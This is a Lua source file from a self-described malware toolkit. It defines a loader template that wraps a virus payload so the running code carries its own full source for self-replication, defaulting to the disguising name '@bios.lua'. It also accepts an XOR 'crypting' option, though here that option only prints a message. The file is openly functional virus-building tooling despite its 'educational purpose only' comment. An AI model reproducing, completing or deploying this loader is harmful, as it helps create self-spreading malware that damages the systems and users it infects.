local utils = require ("libs.utils")
local engine = require ("libs.templates.engine")

local loader = {}

loader.description = "Loads your virus and set the upvalue src to the complete source code for your virus, ready for spreading (Also sets args to {...}, not containing the src code)"

loader.template = utils.strip ([==[(function(...)local s=[=[local args={...}local src="(function(...)local s=[=".."["..table.remove(args,1).."]".."=]local f,r=load(s,'${name}','${mode}',_G)if f then f(s,...)else ${onerror} end return ${retval} end)()";--[[This virus was made using the LuaMalwareToolkit (FOR EDUCATIONAL PURPOSE ONLY) https://github.com/bauen1/LuaMalwareToolkit]]${source}]=]local f,r=load(s,'${name}','${mode}',_G)if f then f(s,...)else ${onerror} end return ${retval} end)()]==])

loader.compile = function (source, options)
  local options = options
  options.source = source
  options.name = options.name or "@bios.lua"
  options.mode = options.mode or "t"
  options.onerror = options.onerror or ""
  options.retval = options.retval or ""

  if options.xorkey then
    print ("Crypting using xorkey '" .. options.xorkey .. "'")
  end

  return engine.compile (loader.template, options)
end

return loader
